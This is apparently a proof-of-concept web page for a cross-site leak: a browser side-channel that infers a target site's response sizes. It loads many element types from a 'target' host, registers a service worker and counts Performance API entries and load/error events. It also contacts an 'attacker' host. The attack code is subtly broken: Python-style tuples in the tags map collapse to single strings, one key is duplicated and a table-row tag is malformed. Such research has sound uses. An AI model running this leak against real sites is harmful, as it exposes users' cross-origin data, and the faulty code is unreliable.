<!DOCTYPE html>
<html>
  <head>
    <title>Response size leak</title>
    <script>

      function show(element, url, size, event, diff) {
        document.getElementById('tbody').innerHTML += `<tr><td>${element}</td><td>${url}</td><td>${size}</td><td>${event}</td><td>${diff}</td><tr>`;
      }

      function get(element, attribute, url, size) {
        let start = performance.getEntries().length;
        let e = document.createElement(element);
        e[attribute[0]] = `${url}?size=${size}&id=${performance.now()}&${element}`;
        if (attribute[1] != '') {
          document[attribute[1]].append(e);
        }

        e.onload = () => {
          show(element, url, size, 'onload', performance.getEntries().length - start);
          //console.log(performance.getEntries())
        }
        e.onerror = () => {
          show(element, url, size, 'onerror', performance.getEntries().length - start);
          //console.log(performance.getEntries())

        }
        e.onabort = () => {
          show(element + ' ' + attribute, url, size, 'onabort', performance.getEntries().length - start);
        }
        e.onemptied = () => {
          show(element + ' ' + attribute, url, size, 'onemptied', performance.getEntries().length - start);
        }
        e.onstalled = () => {
          show(element + ' ' + attribute, url, size, 'onstalled', performance.getEntries().length - start);
        }
        e.onsuspend = () => {
          show(element + ' ' + attribute, url, size, 'onsuspend', performance.getEntries().length - start);
        }
      }

      var base = 'https://target.georgetian.com/';

      var sizes = [
        2,
        95000,
      ];

      var tags = {
        'applet': ('code', 'body'),
        'audio': ('src', 'body'),
        'embed': ('src', 'body'),
        'frame': ('src', 'body'),
        'iframe': ('src', 'body'),
        'img': ('src', 'body'),
        'input': ('src', 'body'),
        'link': ('href', 'body'),
        'object': ('data', 'body'),
        'script': ('src', 'body'),
        'track': ('src', 'body'),
        'video': ('poster', 'body'),
        'video': ('src', 'body'),
      }

      var delay = 200;

      function run() {
        
        fetch('/reset');

        let i = 1;
        console.log(tags);
        for (let tag in tags) {
          for (const size of sizes) {
            setTimeout(get, i * delay, tag, tags[tag], base, size);
            i++;
          }
        }

      }

      if ('serviceWorker' in navigator) {
        addEventListener('load', async () => {
          await navigator.serviceWorker.register('serviceworker.js');
          await fetch('https://attacker.georgetian.com/reset');
          run();
        });
			} else {
        document.body.innerHTML += ('Browser does not support Service Workers');
      }

    </script>

    <style>
      table, th, td {
        border: 1px solid black;
        border-collapse: collapse;
      }
    </style>

  </head>

  <body>
    <!-- <input type="checkbox" id="sw">
    <label>Install Service Worker</label>
    <br>
    <button onclick="run();">Start</button>
    <br> -->
    <table>
      <thead>
        <tr>
          <th>Element</th>
          <th>URL</th>
          <th>Size</th>
          <th>Event</th>
          <th>Entries</th>
        </tr>
      </thead>
      <tbody id="tbody">

      </tbody>
    </table>
  </body>

</html>